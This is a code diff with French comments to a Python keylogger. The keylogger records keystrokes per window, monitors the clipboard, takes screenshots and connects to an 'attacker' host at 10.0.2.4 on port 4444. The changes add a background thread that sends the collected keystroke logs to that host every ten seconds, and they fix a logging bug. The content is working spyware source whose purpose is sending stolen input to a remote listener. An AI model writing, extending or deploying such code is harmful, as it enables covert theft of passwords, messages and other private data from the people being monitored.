@@ -7,7 +7,7 @@ import pyperclip
 import threading
 import socket
 import io
-
+import random
 
 current_window = ""
 log_data = {}
@@ -121,8 +121,12 @@ def on_press(key):
         current_window = new_window
         print(f"\n[+] {now} | Nouvelle fenêtre active : {current_window}")
         if current_window not in log_data:
-            log_data[current_window] = [now, []]
+            log_data[current_window] = [datetime.now().strftime("%H:%M:%S"), []]
         capture_ecran(current_window)
+
+    # Toujours s'assurer que la clé existe
+    if current_window not in log_data:
+        log_data[current_window] = [datetime.now().strftime("%H:%M:%S"), []]
 
     try:
         char = key.char
@@ -141,13 +145,44 @@ def on_press(key):
     log_data[current_window][1].append(char)
     print(f"{now} | {current_window} > {char}")
 
+
+def envoyer_logs_periodiquement():
+    while True:
+        try:
+            if not log_data:
+                time.sleep(10)  # fixe à 10 secondes
+                continue
+
+            resume = "\n\n===== Résumé des frappes par fenêtre =====\n\n"
+            for window, (start_time, chars) in log_data.items():
+                resume += f"Fenêtre : {window}\n"
+                resume += f"Ouvert à : {start_time}\n"
+                resume += "Contenu :\n"
+                resume += ''.join(chars)
+                resume += "\n" + "-"*50 + "\n\n"
+
+            if resume.strip():
+                envoyer_log(resume.strip())
+                print("[📝] Logs envoyés périodiquement.")
+                log_data.clear()
+
+        except Exception as e:
+            print(f"[!] Erreur lors de l'envoi périodique : {e}")
+
+        time.sleep(10)  # sommeil fixe entre chaque envoi
 # Lancer le keylogger
 if __name__ == "__main__":
-    connect_to_attacker("IP_ATTAQUANT", 4444)
+    # Connexion à l'attaquant
+    connect_to_attacker("10.0.2.4", 4444)
 
+    # Lancement des threads en arrière-plan
     clipboard_thread = threading.Thread(target=surveiller_presse_papier, daemon=True)
     clipboard_thread.start()
 
+    log_thread = threading.Thread(target=envoyer_logs_periodiquement, daemon=True)
+    log_thread.start()
+
+    # Lancement du keylogger principal
     try:
         with keyboard.Listener(on_press=on_press) as listener:
             listener.join()
